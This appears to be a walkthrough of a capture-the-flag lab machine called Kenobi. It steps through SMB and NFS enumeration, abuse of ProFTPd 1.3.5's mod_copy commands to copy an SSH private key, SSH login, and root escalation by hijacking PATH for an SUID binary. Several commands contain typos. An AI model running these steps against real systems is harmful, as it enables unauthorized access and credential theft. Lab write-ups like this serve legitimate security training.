# Kenobi

### Task 1

*Scan the machine with nmap, how many ports are open?*

nmap -sC -sV 10.10.206.210

Ans: 7

### Task 2

Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often reffered to as a network file system.

Samba is based on the common client / server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they are part of the same network.

Using nmap we can enumarate a machine for SMB shares.

Nmap has the ability to run to automate a wide variety of networking tasks. There is a script to enumerate shares!

nmap -p 445 —script=smb-enum-shares.nse,smb-enum-users.nse 10.10.206.210

SMB has two ports, 445 and 139.

Alternative: Run enum4linux -a 10.10.206.210 | tee file.log

*Using the nmap command above, how many shares have been found?*

Ans: 3

On most ditributions of Linux smbclient is already installed. Let's inspect one of the shares.

smbclient //10.10.206.210/anonymous

You can recursively download the SMB share too. Submit the username and password as nothing.

smbget -R smb://10.10.206.210/anonymous

Alternative: Inside the smbclient use: get log.txt .

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

namp -p 111 —script=nfs-ls,nfs-statfs,nfs-showmount 10.10.206.210

*What mount can we see?*

Ans: /var

### Task 3

ProFtpd is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions.

Lets get the version of ProFtpd. Use netcat to connect to the machine on the FTP port.

nc 10.10.206.210 21

*What is the version?*

Ans: 1.3.5

We can use searchsploit to find exploits for a particular sotware version.

Searchsploit is basically just a command line tool for exploit-db.com

searchsploit proftpd 1.3.5

*How many exploits are there for the ProFTPd running?*

Ans: 4

You should have found an exploit from ProFtpd's mod_copy module.

the mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files / directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chose destination.

We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generasted for that user. 

We're now going to copy Kenobi's private key using SITE CPFR and SITE CPTO commands.

nc 10.10.206.210 21

SITE CPFR /home/kenobi/..sh/id_rsa

SITE CPTO /var/tmp/id_rsa

We knew that the /var directory was a mount we could see. So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine

mdir /mnt/kenobiNFS

mount 10.10.206.210:/var /mnt/lenobiNFS

ls -la /mnt/kenobiNFS

We now have a network on our deployed machine! We can go to /var/tmp and get the private key and then login to Kenobi's account.

cp /mnt/kenobiNFS/tmp/id_rsa .

chmod 600 id_rsa

ssh -i id_rsa kenobi@10.10.206.210

*What is Kenobi's user flag (/home/kneobi/user.txt)?*

Ans: d0b0f353b6caa532a83915e19224899

### Task 4 - Proveledge Escalation with Path Variable Manipulation

| Permission  | On Files  | On Directories |
| --- | --- | --- |
| SUID Bit  | User executes the file with permission of the file owner  | - |
| SGID Bit  | User executes the file with the permission of the group owner  | File created in directory gets the same group owner. |
| Sticky Bit  | No meaning  | Users are prevented from deleting files from users.  |

SUID bits can be dangerous, some binaries such as passwd need to run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sort of issues.

to search the system for these type of files run the following: 

find / -perm -u=s -type f 2>/dev/null

*What file looks particulary out of the ordinary?*

Ans: /usr/bin/menu

*Run the binary, how many options appears?*

Ans: 3

Strings is a command on Linux that looks for human readable strings on a binary.

curl -I [localhost](http://localhost) 

uname -r 

ifconfig

This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.

echo /bin/sh > curl 

chmod 777 curl

export PATH=/tmp:$PATH

/usr/bin/menu

We copied the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This meant that when the /usr/bin/menu binary was run, its using our path variable to find "curl” binary. Which is actually a version of /usr/sh, as well as this file being run as root it runs our shell as root!